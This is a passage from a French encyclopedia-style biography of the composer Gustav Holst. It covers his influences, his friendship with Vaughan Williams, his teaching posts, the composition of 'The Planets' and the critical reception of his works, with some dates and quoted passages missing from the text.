Comme de nombreux musiciens de sa génération, Holst était sous le charme de Wagner. Il n'avait pas apprécié "Götterdämmerung" quand il l'avait entendue à "Covent Garden" en 1892, mais encouragé par son ami et condisciple Fritz Hart, il persévéra et devint rapidement un ardent wagnérien. Wagner supplanta Sullivan en tant qu'influence principale dans sa musique et pendant quelque temps, comme le note Imogen, « des parties mal-assimilées de "Tristan" étaient présentes dans tous ses chants et ouvertures. » Stanford admirait quelques œuvres de Wagner et avait au début été influencé par lui, mais il désapprouvait les compositions wagnériennes de Holst : « Ça n'ira pas mon garçon ; ça n'ira pas. » Holst respectait Stanford, le décrivant à son condisciple Herbert Howells comme « le seul homme qui pourrait sortir l'un de nous du pétrin, » mais il pensait que ses condisciples avaient plus d'influence que les enseignants sur lui.
En 1895, peu après avoir fêté son vingt-et-unième anniversaire, Holst rencontra Ralph Vaughan Williams qui devint son ami pour la vie et qui eut plus d'influence sur lui que quiconque. Stanford insistait pour que ses étudiants soient auto-critiques, mais Holst and Vaughan Williams devinrent les critiques l'un de l'autre ; chacun jouait sa dernière composition à l'autre alors qu'il travaillait encore dessus. Vaughan Williams observera plus tard : « ce qu'on apprend réellement dans une école ne vient pas tant des enseignants officiels mais plutôt des autres élèves… [nous avons discuté] de tous les sujets, de la note la plus basse du contrebasson jusqu'au roman "Jude l'Obscur". » En 1949, il écrivait sur leur relation : « Holst a déclaré que sa musique a été influencée par celle de son ami, l'inverse est certainement vrai. »
William Morris a également influencé Holst. Selon Vaughan Williams, « Ce fut à ce moment-là que Holst découvrit le sentiment d'unité avec ses semblables qui fit de lui ensuite un grand maître. C'est plus son sens de camaraderie qu'une conviction politique qui le mena, alors qu'il était encore étudiant, à rejoindre le Club Socialiste de la "Kelmscott House" à Hammersmith. » À "", la maison de Morris, Holst assistait à des conférences de son hôte et de Bernard Shaw. Son socialisme était modéré mais il appréciait le club pour sa bonne compagnie et pour son admiration pour Morris en tant qu'homme. Ses idéaux étaient influencés par Morris, mais avaient un éclairage différent. Morris a écrit « Je ne veux pas de l'art ou de la liberté que pour quelques-uns. Je veux que tout le monde soit éduqué selon ses capacités, non selon la quantité d'argent que leurs parents peuvent avoir. » Holst disait : « l'aristocratie dans l'art — l'art n'est que pour quelques élus — mais le seul moyen de trouver ces élus et d'apporter l'art à tout le monde — alors les artistes ont alors une sorte de signe maçonnique qui leur permet de se reconnaître dans la foule. » Il a été invité à diriger le "Hammersmith Socialist Choir" leur faisant chanter des madrigaux de Thomas Morley, des chœurs de Purcell et des œuvres de Mozart, de Wagner et de lui-même. Une de ses choristes était (Emily) Isobel Harrison (1876–1969), une belle soprano de deux ans plus jeune que lui. Il tomba amoureux d'elle ; elle fut d'abord impressionnée par lui, mais ils se fiancèrent bien que sans projet de mariage au vu des faibles revenus de Holst.
Musicien professionnel.
En 1898, le RCM offrit à Holst une bourse pour une année de plus mais il sentait qu'il avait appris autant qu'il le pouvait dans cette école et qu'il était temps, comme il le disait, « d'apprendre par la pratique. » Certaines de ses compositions avaient été publiées et jouées ; l'année précédente "The Times" avait loué son chant "Light Leaves Whisper", « une œuvre modérément élaborée en six parties, traitée avec beaucoup d'expression et un sentiment poétique. » Nonobstant ces réussites ponctuelles, Holst pensait qu'un « homme ne peut vivre seulement de la composition. » Il servit comme organiste dans différentes églises de Londres et continua à jouer du trombone dans des orchestres. En 1898, il fut nommé premier trombone et pianiste-répétiteurr dans la et fit des tournées avec l’Orchestre national royal d'Écosse. Tromboniste compétent plutôt que virtuose, il reçut pourtant des éloges de Hans Richter, chef d'orchestre renommé, pour qui il joua au "Covent Garden". Son salaire était juste suffisant pour vivre, et il le complétait en jouant dans un orchestre populaire appelé "White Viennese Band", dirigé par Stanislas Wurm. Holst aimait jouer pour Wurm et appris beaucoup de lui sur la manière d'obtenir un rubato des musiciens. Néanmoins, désirant dévouer son temps à la composition, Holst trouvait que jouer pour "the Worm" ou dans d'autres petits orchestres était « un gaspillage détestable de temps. » Vaughan Williams cependant n’était pas d'accord avec son ami sur ce sujet, il admettait qu'une partie de la musique jouée était « de pacotille », mais cela a cependant été utile à Holst : 
Avec un modeste revenu assuré, Holst put se marier à Isobel. La cérémonie eut lieu au "Fulham Register Office" le . Le mariage dura jusqu'à sa mort, ils eurent un enfant, Imogen, née en 1907. En 1902 et l’"Orchestre symphonique de Bournemouth" créèrent la symphonie "Cotswold" de Holst, dont le second mouvement est une élégie pour Morris, mort en , trois ans avant que Holst ne commence à travailler sur cette pièce. En 1903, Adolph von Holst meurt laissant un petit héritage. Holst et sa femme décidèrent, comme le racontera plus tard Imogen, 
Compositeur et enseignant.
Alors qu'il séjourne en Allemagne, Holst réfléchit à sa vie professionnelle et en 1903 il décida de ne plus jouer en orchestre pour se concentrer sur la composition. Ses revenus issus de la composition étaient trop faibles pour vivre et deux ans plus tard il accepta un poste d'enseignant à la "James Allen's Girls' School", Dulwich, où il resta en fonction jusqu'en 1921. Il enseigna également à "" où parmi d'autres innovations il donna les premières britanniques de deux cantates de Bach. Les deux postes d'enseignement pour lesquels il est le plus connu sont probablement le poste de directeur musical à la "St Paul's Girls' School", Hammersmith, de 1905 à sa mort, et le poste de directeur musical au de 1907 à 1924. Vaughan Williams parle du passage d'Holst à la "St Paul's Girls' School" : « il supprima la sentimentalité puérile que les écolières étaient censées apprécier et le remplaça par Bach et Vittoria, un terreau parfait pour des esprits immatures, » et au "Morley College" : « [Une] mauvaise tradition devait être supprimée. Les résultats furent au début décourageants mais rapidement un nouvel esprit apparut et la musique au Morley College avec son émanation du "festival de la Pentecôte"… devint une force avec laquelle il fallait compter. » Avant l'arrivée d'Holst, le "Morley College" n'avait jamais traité la musique très sérieusement — la mauvaise tradition dont parle Vaughan Williams ; au début les exigences rigoureuses de Holst firent fuir de nombreux étudiants. Il persévéra et construit petit à petit une classe de mélomanes.
Selon le compositeur Edmund Rubbra, qui suivit ses cours au début des années 1920, Holst était : Il n'a jamais cherché à imposer ses propres idées sur les compositions de ses élèves. Rubbra se rappelle qu'il devinait les difficultés de ses étudiants et les guidait avec douceur pour qu'ils trouvent la solution d'eux-mêmes : 
En tant que compositeur Holst s'inspirait régulièrement de la littérature. Il a mis en musique des poèmes de Thomas Hardy et de Robert Bridges et, une influence particulière, de Walt Whitman, avec "Dirge for Two Veterans" et "The Mystic Trumpeter" (1904). Il écrit une œuvre orchestrale, "Walt Whitman Overture", en 1899. Alors en tournée avec la "Carl Rosa company" Holst lu quelques livres de Max Müller qui lui inspirèrent un franc intérêt pour les textes Sanskrit, en particulier pour les hymnes du "Rig-Véda". Il ne trouvait pas les versions anglaises des textes convaincantes, et décida de faire ses propres traductions malgré son manque de talents comme linguiste. Il prit des cours en 1909 à l'University College de Londres pour étudier le sanskrit. Imogen commente ses traductions : Ses arrangements des traductions de textes en sanskrit incluent "Sita" (1899–1906), un opéra en trois actes basé sur un épisode du "Ramayana" (qu'il fit participer à un concours d'opéras anglais organisé par l'éditeur musical milanais "Tito Ricordi"), "Savitri" (1908), un opéra de chambre basé sur un conte du "Mahabharata", quatre groupes d’"Hymns from the Rig Veda" (1908–14) et deux textes tirés du "Kâlidâsa :" "Two Eastern Pictures" (1909–10) et "The Cloud Messenger" (1913).
Vers la fin du , les cercles musicaux britanniques avaient exprimé un nouvel intérêt pour la musique nationale populaire. Quelques compositeurs, comme Sullivan et Elgar, restaient indifférents mais Parry, Stanford, John Stainer et Alexander Mackenzie étaient les membres fondateurs de la "". Parry considérait qu'en redécouvrant la musique populaire anglaise les compositeurs trouveraient une voix nationale authentique ; il déclarait, « dans les vraies chansons populaires il n'y a pas de honte, pas de vulgarité. » Vaughan Williams a été converti très tôt à cette cause, parcourant la campagne anglaise pour collecter et mettre par écrit les chansons populaires. Cela eut une influence sur Holst. Sans être autant passionné par le sujet que son ami, Holst incorpora un certain nombre de mélodies populaires dans ses propres compositions et fit plusieurs arrangements de chansons populaires collectées par d'autres. La "Somerset Rhapsody" (1906–07) fut écrite sur la suggestion du collectionneur de chansons populaires Cecil Sharp et utilise trois airs que Sharp avait recueillis. Holst décrivit la représentation de cette œuvre au "Queen's Hall" en 1910 comme « son premier succès réel. » Quelques années plus tard Holst s'enthousiasma pour une autre renaissance musicale, la redécouverte des compositeurs anglais de madrigaux. Weelkes était son préféré parmi tous les compositeurs Tudor mais Byrd avait également beaucoup d'importance pour lui.
Holst était un fervent . Il marcha beaucoup en Angleterre, en Italie, en France et en Algérie. En 1908, il voyagea en Algérie suivant un conseil médical pour soigner son asthme et sa dépression due au fait qu'il n'avait pas gagné le prix "Ricordi" avec son opéra "Sita". Ce voyage lui inspira la suite "Beni Mora" qui incorpore de la musique qu'il avait entendue dans les rues algériennes. Vaughan Williams écrit au sujet de cette œuvre exotique : 
Années 1910.
En juin 1911 Holst et ses élèves du "Morley College" donnèrent la première représentation depuis le de "The Fairy Queen" de Purcell. La partition avait été perdue après la mort de Purcell en 1695 et n'avait que récemment été découverte. Vingt-huit élèves de Morley recopièrent les parties vocales et orchestrales. La partition comptait 1500 pages et il fallut près de dix-huit mois aux étudiants pour copier la partition pendant leur temps libre. Un concert en fut donné à l"'Old Vic", précédé par un discours d'introduction de Vaughan Williams. "The Times" loua Holst et ses étudiants pour « une représentation artistique et très intéressante d'une œuvre si importante »
Après ce succès Holst fut déçu de la réception peu chaleureuse l'année suivante de son œuvre chorale "The Cloud Messenger". Il voyagea de nouveau acceptant une invitation de Balfour Gardiner de le rejoindre lui et ses frères et Arnold Bax en Espagne. Durant ces vacances Clifford Bax fit découvrir à Holst l'astrologie, intérêt qui inspirera plus tard sa suite "The Planets". Holst fit l'horoscope de ses amis le reste de sa vie et parlait de l'astrologie comme son « vice familier. »
En 1913, la "St Paul's Girls" ouvrit une nouvelle aile musicale et Holst composa pour cette occasion la "St Paul's Suite". Le nouveau bâtiment comptait une salle insonorisée très bien équipée où il pouvait travailler sans être dérangé.Le couple Holst déménagea dans une maison à "Brook Green", très proche de l'école. Ils avaient durant les six années précédentes, occupé une jolie maison surplombant la Tamise à Barnes, mais l'air de la rivière, souvent brumeux, affectait la respiration de Gustav. Pour les week-ends et les vacances scolaires ils achetèrent un "cottage" à Thaxted, Essex, entouré de bâtiments médiévaux et offrant de nombreuses occasions de "rambling". En 1917 ils déménagèrent pour s'installer dans le centre-ville où ils restèrent jusqu'en 1925.
À Thaxted, Holst se lia d’amitié avec le révérend Conrad Noel, connu comme le "Red Vicar", qui soutenait l"'Independent Labour Party" et qui épousa de nombreuses causes impopulaires auprès de l'opinion conservatrice. Holst fut organiste et chef de chœur occasionnel à la "Thaxted Parish Church" ; il s’intéressa également à la sonnerie de cloches. Il lança un festival de musique annuel à Whitsuntide en 1916 ; des étudiants du "Morley College" et de "St Paul's Girls' School" jouaient ensemble avec des participants locaux. Holst dédia son carol "This Have I Done For My True Love" au révérend Noel ; le compositeur en parlait toujours comme le « The Dancing Day » et le morceau était chanté en dansant dans l’église de Thaxted. Ces innovations suscitèrent des controverses chez les pratiquants traditionnels de l’église. Après trois saisons, anxieux à l'idée d'embarquer ses étudiants dans des conflits religieux -ce qu'il souhaitait éviter- Holst déménagea le "Whitsun Festival" à Dulwich.
Première Guerre mondiale.
Lors du déclenchement de la Première Guerre mondiale Holst essaya de s'enrôler mais fut refusé comme impropre au service militaire. Il se sentit frustré de ne pouvoir participer à l'effort de guerre. Sa femme se porta volontaire pour conduire des ambulances ; Vaughan Williams, ainsi qu'Emil, le frère d'Holst, furent en service actif en France ; ses amis, les compositeurs George Butterworth et moururent au combat. Holst continua à enseigner et à composer ; il travailla sur "The Planets" et prépara la représentation de son opéra de chambre "Savitri". Il fut créé en par des étudiants de la "London School of Opera" au "Wellington Hall" à St John's Wood. À l'époque, il n'attira pas l'attention des grands journaux bien que, lorsqu'il sera joué professionnellement cinq ans plus tard, il sera décrit comme « un parfait petit chef-d’œuvre. » En 1917 il composa "The Hymn of Jesus" pour chœur et orchestre, œuvre qui ne fut pas jouée avant la fin de la guerre.
En 1918, alors que la guerre touchait à sa fin, Holst trouva un travail qui lui permettait de participer à l’effort de guerre. La section musicale du département d'éducation du "YMCA" cherchait des volontaires pour travailler avec les troupes britanniques stationnées en Europe attendant la démobilisation. Le "Morley College" et la "St Paul's Girls' School" lui offrirent un an de disponibilité mais il restait un obstacle : le "YMCA" pensait que son nom sonnait trop allemand pour être acceptable dans un tel rôle. Il changea officiellement « von Holst » en « Holst » par "deed poll" en . Il fut nommé organisateur musical pour le YMCA au Proche-Orient, basé à Thessalonique.
Holst reçu un adieu spectaculaire. Le chef d'orchestre Adrian Boult se rappelle : Il y eut un gros travail pour que tout fut prêt à temps. Les filles de St Paul aidèrent à copier les parties orchestrales et les femmes de Morley et de St Paul apprirent les chants au dernier moment. La représentation eu lieu le devant un public invité comprenant Sir Henry Wood et la plupart des musiciens professionnels de Londres. Cinq mois plus tard, alors que Holst était en Grèce, Boult introduit "The Planets" au public lors d'un concert en ; Holst lui envoya une longue lettre pleine de suggestions mais il ne réussit pas à le convaincre de jouer la suite en entier. Le chef d'orchestre pensait qu'une demi-heure d'une musique si radicalement nouvelle était tout ce que le public pouvait absorber et il joua seulement les cinq premiers mouvements à cette occasion.
Holst apprecia son séjour à Thessalonique d'où il put aller visiter Athènes qui l'impressionna grandement. Sa mission musicale était vaste et il fut même obligé de jouer du violon dans un orchestre local à une occasion : « C'était très amusant mais j'ai peur de ne pas avoir servi à grand chose. » Il retourna en Angleterre en .
Après-guerre.
À son retour de Grèce Holst recommença à enseigner et à composer. En plus de ses emplois actuels, il accepta de donner des cours magistraux de composition à l’université de Reading et rejoignit Vaughan Williams pour enseigner la composition dans leur "alma mater" le "RCM". Dans sa salle insonorisée à la "St Paul's Girls' School" il composa à cette époque "Ode to Death", un arrangement d'un poème de Whitman, qui selon Vaughan Williams est considérée par beaucoup comme la plus belle œuvre chorale de Holst.
Holst, dans sa quarantaine, se trouva soudain très sollicité. L’Orchestre philharmonique de New York et l’Orchestre symphonique de Chicago voulaient être les premiers à jouer "The Planets" aux États-Unis.
Le succès de "The Planets" fut suivi en 1920 par un accueil enthousiaste de "The Hymn of Jesus", décrit dans "The Observer" comme "The Times" est aussi enthousiaste et la présente comme étant: À sa surprise et à son regret Holst devint célèbre La célébrité était quelque chose de complètement étranger à sa nature. Comme le note le musicologue :Il refusait les honneurs et les récompenses et refusait de donner des interviews et de signer des autographes.
L'opéra comique de Holst "" (1923) fut considéré comme une satire de "Parsifal", bien que Holst le niât fermement. Cette œuvre, interprétée par Maggie Teyte dans le rôle de soprano principal et avec Eugène Goossens à la direction, fut reçue avec enthousiasme lors de la première à la Royal Opera House Lors d'un concert à Reading en 1923, Holst glissa. Sa chute provoqua un traumatisme crânien. Il parut se remettre mais ne put accepter une invitation aux États-Unis pour enseigner et diriger à l’université du Michigan.
Après son retour il fut de plus en plus sollicité pour diriger, préparer ses anciennes œuvres à la publication et enseigner comme auparavant. Le stress causé par ses demandes fut trop important pour lui ; sur les conseils de son médecin il annula tous ses engagements professionnels en 1924 et se retira à Thaxted. En 1925, de toutes les anciennes fonctions qu'il occupait précédemment, il n'accepta de ne reprendre que celle au sein de la "St Paul's Girls' School".
Dernières années.
La productivité de Holst en tant que compositeur bénéficia immédiatement de l'abandon de ces autres postes. Il composa durant cette période la "First Choral Symphony" sur un texte de Keats (seuls des fragments existent d'une "Second Choral Symphony" sur un texte de George Meredith). Un court opéra Shakespearien, "", suivit ; aucun n'eut le succès populaire immédiat de "A Moorside Suite" pour brass band en 1928.
En 1927 l'Orchestre symphonique de New York lui commande une symphonie. À la place, il composa une œuvre orchestrale, "", inspirée par le . Elle fut créée en , un mois après la mort de Thomas Hardy, lors d'un concert hommage. Mais l'enthousiasme du public pour Holst commençant à diminuer, la pièce ne fut pas bien accueillie à New York.
Olin Downes dans "The New York Times" jugeait que : Le lendemain de la représentation américaine, Holst dirigeait la première britannique avec l’"Orchestre symphonique de Birmingham". "The Times" reconnaissait la noirceur de l’œuvre mais concédait que cela correspondait à la vision sombre du monde d'Hardy : Holst avait été peiné par les critiques hostiles de certaines de ses premières œuvres mais il restait indifférent à celles d"'Egdon Heath", qu'il considérait selon Adams comme « sa composition réalisée la plus parfaitement. » 
Vers la fin de sa vie, il composa ' (1930) et la BBC lui commanda une œuvre pour orchestre militaire ; le prélude et le scherzo "Hammersmith" sont un hommage au lieu où il avait passé la plus grande partie de sa vie. Le compositeur et critique Colin Matthews considérait l’œuvre comme : Malheureusement, la première de l’œuvre fut programmée le même jour que celle de ' de Walton, laquelle reçut un meilleur accueil du public.
Holst composa en 1931 une musique pour le film britannique "The Bells" et s'amusa à jouer un figurant dans une scène de foule. Le film est maintenant perdu. Il composa une "jazz band piece" qu'Imogen arrangea plus tard pour orchestre sous le titre de "Capriccio".
Tout au long de sa carrière de compositeur, ses opéras ont été plus ou moins bien accueillis. Le dernier qu'il composa, "The Wandering Scholar", fut, selon Matthews : 
L'université Harvard lui ayant proposé un poste de maître de conférence pour les six premiers mois de l'année 1932, il s'y rendit via New York, où il fut à la fois heureux de retrouver son frère, acteur à Broadway et consterné par les sollicitations continuelles des journalistes et des photographes. Il apprécia son séjour à Harvard, mais il tomba malade : un ulcère gastro-duodénal le tint cloué au lit plusieurs semaines.
Il retourna en Angleterre, à Cotswolds, brièvement rejoint par son frère pour des vacances communes. Son état de santé déclina et il cessa toute activité musicale, une des dernières ayant été de guider les jeunes musiciennes de l'orchestre de la "St Paul's Girls' School" pour l'interprétation de sa dernière œuvre, "Suite Brook Green", en .
Il mourut à Londres le à 59 ans, d'insuffisance cardiaque à la suite de l'opération de son ulcère. Ses cendres reposent en la cathédrale de Chichester dans le Sussex, près du mémorial de Thomas Weelkes, son compositeur favori de l'époque Tudor. L'évêque George Bell prononça l'oraison funèbre et Vaughan Williams dirigea des œuvres d'Holst et de lui-même.
Musique.
Gustav Holst laisse environ .
Style.
L'intégration de Holst des chansons populaires, non seulement dans un sens mélodique mais également dans leur simplicité et leur économie d'expression, l'aida à développer un style que beaucoup de ses contemporains, même ses admirateurs, trouvaient austère et cérébral. Ceci contredit l'identification populaire de Holst aux "Planets", œuvre qui, selon Matthews, a caché son statut de compositeur réellement original. Pour contrer les critiques de froideur de la musique de Holst, Imogen parle d'une musique « sweeping modal tunes mov[ing] reassuringly above the steps of a descending bass, » alors que Michael Kennedy met en avant les douze arrangements d' de 1929, et les douze arrangements de chansons populaires galloises pour chœur seul de 1930–1931 comme œuvres vraiment chaleureuses.
Beaucoup des techniques que Holst employait — signatures rythmiques non conventionnelles, gammes montantes et descendantes, ostinato, bitonalité et parfois polytonalité — le range à part des autres compositeurs anglais. Matthews le compare à des compositeurs étrangers contemporains comme Hindemith Vaughan Williams remarque que Holst disait toujours dans sa musique ce qu'il souhaitait dire, directement et de manière concise ; « il n'avait pas peur d'être évident quand il le fallait, il n'hésitait pas non plus à être distant quand l'éloignement exprimait son but. » Kennedy a conjecturé que le style économique de Holst était en partie dû à sa santé faible : « […] l'effort de le coucher sur papier le contraignait à une économie artistique que certains trouvaient aller trop loin. » Cependant, en tant que musicien d'orchestre et instrumentiste expérimenté, Holst comprenait la musique du point de vue des musiciens et s'assurait, quelle qu’en soit la difficulté, que leur partition fut toujours jouable. Selon son élève Jane Joseph, Holst favorisait lors des représentations « un esprit de camaraderie pratique […] personne ne connaissait mieux que lui l'ennui possible d'un musicien professionnel, et la musique qui rendait impossible l'ennui. »
Premières œuvres.
Bien que Holst ait écrit un grand nombre d’œuvres — en particulier des chants — durant ses années d'études, il définissait presque tout ce qu'il avait écrit avant 1904 comme des « early horrors. » Néanmoins, le compositeur et critique Colin Matthews reconnait dans ces œuvres d'apprentissage un « flair orchestral instinctif. » Parmi les quelques pièces de cette période montrant un peu d'originalité, Matthews met en avant le Trio pour cordes en sol mineur de 1894 (joué pour la première fois en 1974) comme la première œuvre de Holst non dérivée. Matthews et Imogen Holst soulignent tous deux le mouvement "Elegy" de "The Cotswold Symphony" (1899–1900) parmi les œuvres les plus accomplies des œuvres d'apprentissage et Imogen entraperçoit des morceaux de la personnalité de son père dans la "Suite de ballet" de 1899 et dans l’"Ave Maria" de 1900. Matthews et elle ont émis l'hypothèse que Holst trouva sa voix authentique dans sa mise en musique des vers de Whitman, "The Mystic Trumpeter" (1904). Dans cette pièce, non jouée publiquement avant 1989, Holst emploie pour la première fois la technique de bitonalité.
Années expérimentales.
Au début du , selon Matthews, l'orientation future de Holst en tant que compositeur était loin d'être claire. Il semblait qu'il allait suivre Schoenberg dans le romantisme ; à la place, durant la première décennie du nouveau siècle, Holst chercha l'inspiration dans une variété de sources. Son but, comme il le dit dans une lettre au compositeur William Gillies Whittaker, était de découvrir « le (ou un) langage musical de la langue anglaise — car il pensait que Purcell avait fait plus de deux siècles plut tôt dans "Dido and Æneas".
Période indienne.
Le recherche de Holst de sa voie de composition le conduit à explorer au-delà des traditions musicales anglaises. Son intérêt pour la mythologie indienne, partagée par nombre de ses contemporains, devient pour la première fois évident musicalement dans l'opéra "Sita" (1901–06). Durant la longue gestation de cet opéra Holst travailla sur d'autres pièces à thème indien dont "Maya" (1901) pour violon et piano, considérée par le compositeur et écrivain Raymond Head comme « une pièce de salon insipide dont le langage musical est dangereusement proche de Stephen Adams. » Cependant, à travers Vaughan Williams, Holst découvrit et devint un admirateur de la musique de Ravel qu'il considérait comme un « modèle de pureté » du niveau de Haydn, un autre compositeur qu'il admirait grandement. L'influence combinée de Ravel, du spiritualisme hindou et des chansons populaires anglaises permirent à Holst de s'affranchir de l'influence de Wagner et de Richard Strauss et de construire son propre style. selon Rubbra, la publication en 1911 des hymnes "Rig Veda" de Holst fut un évènement marquant du développement du compositeur : « Avant cela, la musique de Holst avait, en effet, montré la clarté d'énonciation qui l'a toujours caractérisé, mais harmoniquement il y avait peu pour le marquer comme une personne importante de la musique moderne. » Dickinson décrit ces arrangements védiques comme picturaux plutôt que religieux ; bien que la qualité soit variable, les textes sacrés « touchent clairement des cordes vitales dans l'imagination du compositeur. » Alors que la musique de l'arrangement des vers indiens de Holst reste principalement occidentale dans son caractère, dans certains arrangements védiques il expérimente le râga indien.
L'opéra de chambre "Savitri" (1908) a été écrit pour trois voix solos, un petit chœur de femmes caché et une combinaison instrumentale de deux flûtes, un cor anglais et un double quatuor à cordes. Le critique musical John Warrack parle de « la subtilité expressive extraordinaire » avec laquelle Holst déploie les forces éparses : « …Les deux lignes vocales non accompagnées ouvrant l’œuvre habilement véhiculent le rapport entre la mort, professant de manière constante à travers la forêt, et Savitri, ses réponses effrayées flottant autour de lui, incapable d'échapper à son attraction harmonique. » Head décrit l’œuvre comme unique à son époque à cause de son intimité compacte et la considère comme la tentative de Holst la plus réussie pour en finir avec la domination du chromatisme Wagnérien dans sa musique. Dickinson considère cette œuvre comme un pas significatif « non vers l'opéra mais vers une poursuite idiomatique de la vision [de Holst]. » Au sujet des textes de Kālidāsa, Dickinson rejette "The Cloud Messenger" (1910–12) comme une « accumulation d'incidents décousus, d'épisodes dramatiques opportunistes et d'effusions extatiques » qui illustrent la confusion créative du compositeur durant cette période ; "Two Eastern Pictures" (1911), selon Dickinson, « donne une impression finale plus mémorable de Kālidāsa. »
Musique populaire et autres influences.
La mise en musique des textes indiens n'est qu'une partie des compositions de Holst entre 1900 et 1914. Un facteur important dans son développement musical est le renouveau des chants populaires anglais que Matthews décrit comme étant « les catalyseurs qui ont permis à Holst de fusionner les éléments disparates formateurs qui devaient faire de lui un compositeur mûr. » L'influence de la musique populaire est évidente dans la suite orchestrale "A Somerset Rhapsody" (1906–07), une œuvre basée originellement sur sept thèmes populaires, réduite plus tard à quatre thèmes. En observant les ressemblances avec "Norfolk Rhapsody" de Vaughan Williams, Dickinson remarque, qu'avec sa structure globale ferme, la composition de Holst « s'élève au-delà du niveau d'… une chanson de sélection. » Imogen admet que la découverte de Holst des chants populaires anglais « transforme son écriture orchestrale» et que la composition de "A Somerset Rhapsody" a beaucoup fait pour bannir les chromatismes qui avaient dominé ses premières compositions. Dans "Two Songs without Words" en 1906, Holst montre qu'il peut créer ses propres musiques à partir du style populaire. Une fantaisie orchestrale populaire composée également en 1906, "Songs of the West", est retirée par le compositeur et n'est jamais publiée bien qu'elle ressorte dans les années 1980 sous la forme d'un arrangement pour ensembles de vents par .
Dans les années avant la Première guerre mondiale, Holst compose dans plusieurs genres. Matthews considère l'évocation d'une ville nord-africaine dans la suite "Beni Mora" en 1908 comme l'œuvre la plus personnelle du compositeur jusque-là ; le troisième mouvement donne un aperçu du minimalisme avec sa répétition constante d'un thème de quatre mesures. Holst écrit deux suites pour orchestre militaire, en et en . Cette première suite, une œuvre musicale très originale et grave maintenant un classique du répertoire de musique militaire, est le signal de fin de ce que Short décrit comme « les transcriptions habituelles et les extraits d'opéras qui envahissaient le répertoire de musique militaire. » Il compose également en 1911 "Hecuba's Lament", une mise en musique de la traduction par Gilbert Murray d'Euripide construite sur un refrain à sept temps qui selon Dickinson représente le mépris d'Hécube pour la colère divine. En 1912 Holst compose deux psaumes avec lesquels il expérimente le plain-chant. La même année voit la composition de la durable "St Paul's Suite" (un morceau « gai mais rétrograde » selon Dickinson), et l'échec de sa grande œuvre orchestrale "Phantastes".
Plein épanouissement.
"Les Planètes".
Holst a l'idée des "Planètes" en 1913, en partie pour son intérêt de l'époque pour l'astrologie et également pour sa détermination, malgré l'échec de "Phantastes", à composer une grande œuvre orchestrale. Le format choisi a pu être influencé par les "Fünf Orchesterstücke" de Schoenberg, ou selon Matthews par "La Mer" de Debussy Holst commence à composer "les planètes" en 1914, les mouvements sont écrits dans le désordre par rapport à la version finale, "Mars" en premier suivi par "Vénus" et "Jupiter". "Saturne", "Uranus" et "Neptune" sont tous composés en 1915 et "Mercure" est terminé en 1916.
Chaque planète a un caractère différent. Dickinson observe « qu'aucune planète n'emprunte le tempérament d'une autre. » Dans "Mars", une combinaison de rythmes inégaux, d'appels de trompette et de dissonances harmoniques donne une musique guerrière que Short considère comme unique dans son expression de violence et de terreur pure, « … l'intention de Holst étant de dépeindre la réalité de la guerre plutôt que de glorifier les actes d'héroïsme. » Dans "Vénus" Holst utilise la musique d'une œuvre vocale abandonnée, "A Vigil of Pentecost", pour l'ouverture ; le sentiment principal du mouvement est une résignation calme et la nostalgie. "Mercure" est dominé par des rythmes inégaux et des changements rapides de thèmes pour représenter le vol rapide du messager ailé. "Jupiter" est connu pour sa mélodie centrale, selon Dickinson « une relaxation fantastique». Dickinson et d'autres critiques ont dénoncé l'utilisation plus tard de l'air dans l’hymne patriotique "I Vow to Thee, My Country" — malgré la connivence totale de Holst.
Pour "Saturne" Holst utilise une nouvelle fois une ancienne œuvre vocale, "Dirge and Hymeneal", comme base pour ce mouvement où des accords répétés représentent l'approche inexorable de la vieillesse. "Uranus" qui suit contient des éléments de la "Symphonie fantastique" de Berlioz et de l’"Apprenti sorcier" de Dukas, dans sa représentation du magicien qui « disparait dans la fumée alors que la dynamique sonore du mouvement diminue d'un fff vers un ppp en quelques mesures. » "Neptune", le mouvement final, conclut avec un chœur sans paroles de femmes disparaissant progressivement, un effet que Warrack compare à « une intemporalité en suspens … sans fin, puisque l'espace ne s'arrête pas, mais à la dérive dans le silence éternel. » En dehors de sa concession avec "I Vow to Thee", Holst insiste sur l'unité de l'œuvre et s'oppose à l'exécution des mouvements individuellement. Cependant Imogen écrit que la pièce a « souffert d'être joués en extraits comme musique d'ambiance. »
Maturité.
Pendant et après la composition des "Planètes", Holst écrit ou arrange plusieurs œuvres vocales et chorales, nombre d'entre elles pour le "Thaxted Whitsun Festivals", 1916–18. Ces œuvres incluent "Six Choral Folksongs", 1916, basée sur une mélodie de "West Country", et "Swansea Town", avec sa « mélodie sophistiquée », est selon Dickinson la plus mémorable de ces six morceaux. Holst minimise cette musique comme une « forme limitée d'art » dans laquelle le « maniérisme est presque inévitable. » Cependant le compositeur Alan Gibbs pense que cet arrangement de Holst est au moins l'égal des "Five English Folk Songs" de 1913 de Vaughan Williams. L’œuvre majeure de Holst suivant "Les Planètes" est l’"Hymn of Jesus" terminé en 1917. Les paroles sont tirées d'un texte gnostique, les actes apocryphes de Saint-Jean, utilisant une traduction du grec que Holst a préparé avec l’aide de et de Jane Joseph. Head commente le caractère novateur de l’"Hymne": « D'un seul coup Holst avait mis de côté les oratorios sentimentaux Victoriens et Édouardiens et avait créé le précurseur du type d’œuvres que John Tavener, par exemple, allait composer dans les années 1970. » Matthews avance que la qualité « extasiée » de l"'Hymn" n'est égalée dans la musique anglaise que « peut-être par "The Vision of Saint Augustine" de Tippett ; » l'hymne comprend un plain-chant, deux chœurs éloignés l'un de l'autre pour souligner, le dialogue, de la danse et des « bouleversements d'accords explosifs. »
Dans "Ode to Death" (1918–19), le ton calme et résigné est vu par Matthews comme une « volte-face abrupte » après la spiritualité pleine de vie de l"Hymne". Warrack parle de tranquillité distante ; Imogen Holst pense que l"'Ode" exprime le rapport à la mort de Holst. Le morceau a rarement été joué depuis sa création en 1922 bien que le compositeur pense que c'était la meilleure œuvre de Holst à cette date.
Le critique Ernest Newman considère "The Perfect Fool" comme le « meilleur des opéras modernes britanniques, » mais sa faible longueur inhabituelle (environ une heure) et sa nature parodique et fantaisiste — décrite par "The Times" comme « un puzzle brillant — » le range en dehors des opéras classiques. Seule la musique de ballet de l'opéra, que "The Times" considère comme « la chose la plus génial dans un travail génial avec des moments géniaux, » a été régulièrement jouée depuis 1923. Le livret de Holst a été grandement critiqué mais Edwin Evans remarque le plaisir rare à l'opéra de pouvoir entendre les paroles chantées.
Dernières œuvres.
